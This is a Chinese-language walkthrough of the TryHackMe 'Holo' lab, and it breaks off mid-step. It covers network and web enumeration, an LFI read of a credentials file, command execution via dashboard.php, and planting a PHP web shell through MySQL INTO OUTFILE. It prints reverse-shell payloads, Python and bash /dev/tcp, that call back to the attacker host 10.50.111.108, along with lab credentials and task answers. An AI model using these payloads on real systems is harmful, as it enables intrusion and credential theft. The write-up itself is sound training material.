# Recon

首先根据提供的网络拓扑图先扫描一下网段 

![pic](https://github.com/maxzxc0110/hack-study/blob/main/img/1658482726896.jpg)

```
nmap -sV -sC -p- -v 10.200.114.0/24
...
...
Nmap scan report for 10.200.114.33
Host is up (0.094s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:4b:83:e6:d1:aa:c3:d0:73:af:25:a7:fb:52:b4:a9 (RSA)
|   256 66:d8:76:22:b2:2b:60:94:6a:76:59:3f:4d:2d:e3:ff (ECDSA)
|_  256 87:2a:2c:70:c6:cd:24:79:dd:3e:7e:2f:13:d5:64:8f (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 21 disallowed entries (15 shown)
| /var/www/wordpress/index.php 
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php 
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php 
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes 
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php 
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php 
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade 
|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
|_http-title: holo.live
|_http-generator: WordPress 5.5.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.92%I=7%D=7/24%Time=62DE113F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.200.112.250
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0f:6f:f4:97:a2:f1:7a:6a:9c:44:fe:e0:09:05:dd:c6 (RSA)
|   256 59:bd:f8:47:fc:1e:3a:2f:98:fd:84:5f:11:84:f1:84 (ECDSA)
|_  256 f4:cc:6c:f2:ca:dc:fa:74:68:eb:25:b7:f6:ac:09:de (ED25519)
1337/tcp open  http    Node.js Express framework
|_http-title: Error
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (2 hosts up) scanned in 103.26 seconds
           Raw packets sent: 133256 (5.851MB) | Rcvd: 131195 (5.248MB)


```

有两个IP有返回：
1. ```10.200.114.33```
返回端口服务：22,80,33060

2. ```10.200.114.250```
返回端口服务：22,1337


```10.200.114.33```详细端口信息
```
┌──(root㉿rock)-[~]
└─# nmap -sV -Pn -A -O 10.200.114.33 -p 22,80,33060
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 23:50 EDT
Nmap scan report for 10.200.114.33
Host is up (0.075s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:4b:83:e6:d1:aa:c3:d0:73:af:25:a7:fb:52:b4:a9 (RSA)
|   256 66:d8:76:22:b2:2b:60:94:6a:76:59:3f:4d:2d:e3:ff (ECDSA)
|_  256 87:2a:2c:70:c6:cd:24:79:dd:3e:7e:2f:13:d5:64:8f (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 21 disallowed entries (15 shown)
| /var/www/wordpress/index.php 
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php 
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php 
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes 
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php 
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php 
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade 
|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
|_http-title: holo.live
|_http-generator: WordPress 5.5.3
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000

```



```10.200.112.250```详细端口信息
```
┌──(root㉿rock)-[~]
└─# nmap -sV -Pn -A -O 10.200.112.250 -p 22,1337
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 05:32 EDT
Nmap scan report for 10.200.112.250
Host is up (0.088s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0f:6f:f4:97:a2:f1:7a:6a:9c:44:fe:e0:09:05:dd:c6 (RSA)
|   256 59:bd:f8:47:fc:1e:3a:2f:98:fd:84:5f:11:84:f1:84 (ECDSA)
|_  256 f4:cc:6c:f2:ca:dc:fa:74:68:eb:25:b7:f6:ac:09:de (ED25519)
1337/tcp open  http    Node.js Express framework
|_http-title: Error
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   88.83 ms 10.200.112.250

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds

```

## 10.200.114.33 Recon

```
┌──(root㉿rock)-[~/thm/holo]
└─# python3 /root/dirsearch/dirsearch.py -e* -t 100 -u http://10.200.114.33      
  _|. _ _  _  _  _ _|_    v0.4.2.6
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15418

Output File: /root/dirsearch/reports/10.200.114.33/_22-07-24_23-48-41.txt

Target: http://10.200.114.33/

[23:48:41] Starting: 
[23:50:32] 200 -   19KB - /license.txt 
[23:50:52] 200 -    7KB - /readme.html                                        
[23:50:52] 301 -    0B  - /rating_over.  ->  http://10.200.114.33/rating_over 
[23:50:54] 200 -  913B  - /robots.txt    
[23:51:15] 200 -    0B  - /wp-content/                                        
[23:51:16] 200 -    0B  - /wp-config.php     
[23:51:16] 200 -    0B  - /wp-cron.php                                        
[23:51:16] 301 -    0B  - /wp-register.php  ->  http://www.holo.live/wp-login.php?action=register
[23:51:16] 200 -  613B  - /wp-json/wp/v2/users/                               
[23:51:16] 302 -    0B  - /wp-signup.php  ->  http://www.holo.live/wp-login.php?action=register
[23:51:17] 200 -   74KB - /wp-json/ 
```

首页源代码看到有一个```www.holo.live```的域名，看起来是一个wordpress站点

把```www.holo.live```和```holo.live```添加进hosts文件

```echo "10.200.114.33 www.holo.live">> /etc/hosts```
```echo "10.200.114.33 holo.live">> /etc/hosts```


robots.txt暴露了一些文件和站点路径
```
User-Agent: *
Disallow: /var/www/wordpress/index.php
Disallow: /var/www/wordpress/readme.html
Disallow: /var/www/wordpress/wp-activate.php
Disallow: /var/www/wordpress/wp-blog-header.php
Disallow: /var/www/wordpress/wp-config.php
Disallow: /var/www/wordpress/wp-content
Disallow: /var/www/wordpress/wp-includes
Disallow: /var/www/wordpress/wp-load.php
Disallow: /var/www/wordpress/wp-mail.php
Disallow: /var/www/wordpress/wp-signup.php
Disallow: /var/www/wordpress/xmlrpc.php
Disallow: /var/www/wordpress/license.txt
Disallow: /var/www/wordpress/upgrade
Disallow: /var/www/wordpress/wp-admin
Disallow: /var/www/wordpress/wp-comments-post.php
Disallow: /var/www/wordpress/wp-config-sample.php
Disallow: /var/www/wordpress/wp-cron.php
Disallow: /var/www/wordpress/wp-links-opml.php
Disallow: /var/www/wordpress/wp-login.php
Disallow: /var/www/wordpress/wp-settings.php
Disallow: /var/www/wordpress/wp-trackback.php
```

wpscan 扫描：
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# wpscan --url http://www.holo.live 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.holo.live/ [10.200.114.33]
[+] Started: Mon Jul 25 03:31:22 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-UA-Compatible: IE=edge
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://www.holo.live/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.holo.live/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.holo.live/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.holo.live/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.3 identified (Insecure, released on 2020-10-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.holo.live/index.php/feed/, <generator>https://wordpress.org/?v=5.5.3</generator>
 |  - http://www.holo.live/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.3</generator>

[+] WordPress theme in use: generatepress
 | Location: http://www.holo.live/wp-content/themes/generatepress/
 | Last Updated: 2022-02-09T00:00:00.000Z
 | Readme: http://www.holo.live/wp-content/themes/generatepress/readme.txt
 | [!] The version is out of date, the latest version is 3.1.3
 | Style URL: http://www.holo.live/wp-content/themes/generatepress/style.css
 | Style Name: GeneratePress
 | Style URI: https://generatepress.com
 | Description: GeneratePress is a lightweight WordPress theme built with a focus on speed and usability. Performanc...
 | Author: Tom Usborne
 | Author URI: https://tomusborne.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.holo.live/wp-content/themes/generatepress/style.css, Match: 'Version: 2.4.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jul 25 03:31:45 2022
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 34.824 KB
[+] Data Received: 200.738 KB
[+] Memory used: 225.969 MB
[+] Elapsed time: 00:00:22

```

**[Task 8] and [Task 11]  - Enumerating Files and Subdomains found on L-SRV01**


> What is the last octet of the IP address of the public-facing web server?

> 33

> How many ports are open on the web server?

> 3

> What CME is running on port 80 of the web server?

> wordpress

> What version of the CME is running on port 80 of the web server?

> 5.5.3


> What is the HTTP title of the web server?

> holo.live

# L-SRV02

## vhost爆破
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# gobuster vhost -u holo.live -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://holo.live
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/07/25 03:50:41 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.holo.live (Status: 200) [Size: 7515]
Found: admin.holo.live (Status: 200) [Size: 1845]
```

得到两个新的domain：```dev.holo.live```,```admin.holo.live```,把这两个domain加进hosts文件
```
10.200.114.33 www.holo.live
10.200.114.33 holo.live
10.200.114.33 dev.holo.live
10.200.114.33 admin.holo.live
```

** Web App Exploitation Punk Rock 101 err Web App 101**

> What domains loads images on the first web page?

> www.holo.live

> What are the two other domains present on the web server? Format: Alphabetical Order

> admin.holo.live,dev.holo.live

## web brute

### 对dev.holo.live的目录爆破（指定扩展名）

```
┌──(root💀kali)-[~/tryhackme/holo]
└─# gobuster dir -t 50  --no-error --url http://dev.holo.live -w /usr/share/wordlists/Web-Content/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.holo.live
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/07/25 04:20:09 Starting gobuster in directory enumeration mode
===============================================================
/about.php            (Status: 200) [Size: 9612]
/login                (Status: 403) [Size: 278] 
/login.php            (Status: 403) [Size: 278] 
/index.php            (Status: 200) [Size: 7515]
/images               (Status: 301) [Size: 315] [--> http://dev.holo.live/images/]
/img.php              (Status: 200) [Size: 0]                                     
/admin                (Status: 403) [Size: 278]                                   
/admin.php            (Status: 403) [Size: 278]                                   
/css                  (Status: 301) [Size: 312] [--> http://dev.holo.live/css/]   
/js                   (Status: 301) [Size: 311] [--> http://dev.holo.live/js/]    
/javascript           (Status: 301) [Size: 319] [--> http://dev.holo.live/javascript/]
/fonts                (Status: 301) [Size: 314] [--> http://dev.holo.live/fonts/]     
/talents.php          (Status: 200) [Size: 11360]                                     
/sass                 (Status: 301) [Size: 313] [--> http://dev.holo.live/sass/]      
                                                                                      
===============================================================
2022/07/25 04:34:37 Finished
===============================================================

```



### 对admin.holo.live的目录爆破
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# python3 /root/dirsearch/dirsearch.py -e* -t 50 -u http://admin.holo.live                                  130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 50
Wordlist size: 15492

Output File: /root/dirsearch/reports/admin.holo.live/_22-07-25_04-16-43.txt

Error Log: /root/dirsearch/logs/errors-22-07-25_04-16-43.log

Target: http://admin.holo.live/

[04:16:44] Starting:                                          
[04:17:42] 301 -  319B  - /assets  ->  http://admin.holo.live/assets/       
[04:17:55] 302 -    0B  - /dashboard.php  ->  index.php                     
[04:17:58] 403 -  280B  - /docs/                                            
[04:17:58] 301 -  317B  - /docs  ->  http://admin.holo.live/docs/           
[04:18:02] 301 -  321B  - /examples  ->  http://admin.holo.live/examples/   
[04:18:02] 403 -  280B  - /examples/                                        
[04:18:12] 200 -    2KB - /index.php                                        
[04:18:12] 200 -    2KB - /index.php/login/                                 
[04:18:14] 301 -  323B  - /javascript  ->  http://admin.holo.live/javascript/
[04:18:43] 200 -  135B  - /robots.txt  
```

robots.txt暴露出一个文件```creds.txt```，但是在浏览器上没有权限打开
```
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt
```

**Task 10  Web App Exploitation What the Fuzz?**

> What file leaks the web server's current directory?

> robots.txt

> What file loads images for the development domain?

> img.php

> What is the full path of the credentials file on the administrator domain?

> /var/www/admin/supersecretdir/creds.txt


dev下的img.php存在一个LFI漏洞，刚好```creds.txt```这个文件我们在浏览器上没有阅读权限，使用LFI可以读取到文件内容

payload：
```
http://dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt
```

登录密码为：
```
admin:DBManagerLogin!
```

**Task 12  Web App Exploitation What is this? Vulnversity?**

> What file is vulnerable to LFI on the development domain?

> img.php

> What parameter in the file is vulnerable to LFI?

> file

> What file found from the information leak returns an HTTP error code 403 on the administrator domain?

> /var/www/admin/supersecretdir/creds.txt

> Using LFI on the development domain read the above file. What are the credentials found from the file?

> admin:DBManagerLogin!


登录admin后台，来到一个简陋的后台页面，查看网页源代码发现一行注释
```
//if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} 
```

看起来是接收一个cmd参数，如果为空，读取 ```/tmp/Views.txt```文件，不为空则可以执行输入的命令

使用下面payload验证
```
http://admin.holo.live/dashboard.php?cmd=whoami
```

页面输出：
```
www-data
```

使用下面payload
```
http://admin.holo.live/dashboard.php?cmd=python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.50.111.108",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

拿到一个rev shell
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# nc -lnvp 4242            
listening on [any] 4242 ...
connect to [10.50.111.108] from (UNKNOWN) [10.200.114.33] 52394
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

**Task 13  Web App Exploitation Remote Control Empanadas**

> What file is vulnerable to RCE on the administrator domain?

> dashboard.php

> What parameter is vulnerable to RCE on the administrator domain?

> cmd

> What user is the web server running as?

> www-data



查看根目录，存在一个```.dockerenv```文件，说明我们在docker容器里
```
www-data@6ef44d2b6a12:/$ ls -alh
ls -alh
total 340K
drwxr-xr-x   1 root root 4.0K Jul 25 07:27 .
drwxr-xr-x   1 root root 4.0K Jul 25 07:27 ..
-rwxr-xr-x   1 root root    0 Jul 25 07:27 .dockerenv
-rw-r--r--   1 root root 260K Jan  4  2021 apache.tar
drwxr-xr-x   1 root root 4.0K Jan 16  2021 bin
drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Jul 25 07:27 dev
drwxr-xr-x   1 root root 4.0K Jul 25 07:27 etc
drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
drwxr-xr-x   1 root root 4.0K May 23  2017 lib
drwxr-xr-x   1 root root 4.0K Jan 16  2021 lib64
drwxr-xr-x   2 root root 4.0K Sep 21  2020 media
drwxr-xr-x   2 root root 4.0K Sep 21  2020 mnt
drwxr-xr-x   2 root root 4.0K Sep 21  2020 opt
dr-xr-xr-x 139 root root    0 Jul 25 07:27 proc
drwx------   2 root root 4.0K Sep 21  2020 root
drwxr-xr-x   1 root root 4.0K Jan 16  2021 run
drwxr-xr-x   1 root root 4.0K Jan 16  2021 sbin
drwxr-xr-x   2 root root 4.0K Sep 21  2020 srv
dr-xr-xr-x  13 root root    0 Jul 25 07:27 sys
drwxrwxrwt   1 root root 4.0K Jul 25 07:27 tmp
drwxr-xr-x   1 root root 4.0K Sep 21  2020 usr
drwxr-xr-x   1 root root 4.0K Jan 16  2021 var

```

查看admin下的数据库链接文件
```
www-data@9b49d5e2bc5e:/var/www/admin$ cat db_connect.php
cat db_connect.php
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>

```

192.168.100.1应该是一个内网IP，跑着一个mysql服务

尝试连接,有一个DashboardDB数据库

```
www-data@9b49d5e2bc5e:/var/www/admin$ mysql -h 192.168.100.1 -u admin -p
mysql -h 192.168.100.1 -u admin -p
Enter password: !123SecureAdminDashboard321!

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.22-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| DashboardDB        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

```

只有一张users表，发现另一个用户名：gurag
```
mysql> use DashboardDB;
use DashboardDB;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_DashboardDB |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
2 rows in set (0.00 sec)

```

```
#!/usr/bin/python3
import socket
host = "192.168.100.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
  s.connect((host,port))
  print("Port ", port, " is open")
 except:
  print("Port ", port, " is closed")
```

传到靶机
```
www-data@9b49d5e2bc5e:/tmp$ curl http://10.50.111.108/scan.py -o scan.py
curl http://10.50.111.108/scan.py -o scan.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   289  100   289    0     0    642      0 --:--:-- --:--:-- --:--:--   642
www-data@9b49d5e2bc5e:/tmp$ python3 scan.py
python3 scan.py
Port  21  is closed
Port  22  is open
Port  53  is closed
Port  80  is open
Port  443  is closed
Port  3306  is open
Port  8443  is closed
Port  8080  is open

```

开启的端口有：22,80,3306,8080

**Task 16  Situational Awareness Living off the LANd**

> What is the Default Gateway for the Docker Container?

> 192.168.100.1

> What is the high web port open in the container gateway?

> 8080

> What is the low database port open in the container gateway?

> 3306


**Task 17  Situational Awareness Dorkus Storkus - Protector of the Database**

> What is the server address of the remote database?

> 192.168.100.1

> What is the password of the remote database?

> !123SecureAdminDashboard321!

> What is the username of the remote database?

> admin

> What is the database name of the remote database?

> DashboardDB

> What username can be found within the database itself?

> gurag

# L-SRV01

由于我们可以连接在```192.168.100.1```上的mysql服务，可以通过滥用mysql服务来横向到目标机器，这里的思路至少有两条
1. UDF
2. 生成一个web shell文件

这里生成一个web shell 文件
```
mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/cmd.php';
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/cmd.php';
Query OK, 1 row affected (0.00 sec)

```
成功写入，执行whoami命令
```
www-data@9f54bfa15108:/var/www/admin$ curl 192.168.100.1:8080/cmd.php?cmd=whoami
<w/admin$ curl 192.168.100.1:8080/cmd.php?cmd=whoami
www-data
```

**Task 18  Docker Breakout Making Thin Lizzy Proud**

> What user is the database running as?

> www-data

现在我们要验证mysql上的靶机是否可以与我们的kali通信，先在本地kali起一个python web server

使用下面命令测试

```
www-data@9f54bfa15108:/var/www/admin$ curl 192.168.100.1:8080/cmd.php?cmd=wget http://10.50.111.108/any
<00.1:8080/cmd.php?cmd=wget http://10.50.111.108/any
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>

```

收到web访问请求，证明可以通信，也就是说我们可以获得一个rev shell
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# python3 -m http.server 80                                                                                   1 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.114.33 - - [26/Jul/2022 03:38:05] code 404, message File not found
10.200.114.33 - - [26/Jul/2022 03:38:05] "GET /any HTTP/1.1" 404 -

```

## foothold
准备一个rev babsh文件
```
┌──(root💀kali)-[~/tryhackme/holo]
└─# cat rev.sh
#!/bin/bash
bash -i >& /dev/tcp/10.50.111.108/4242 0>&1
```

本地起一个web server

思路是rce让mysql主机访问上面的脚本并执行，返回一个rev shell

rev shell放在一个bash脚本里的好处是可以规避一些引号和特殊字符的问题

使用下面payload
```
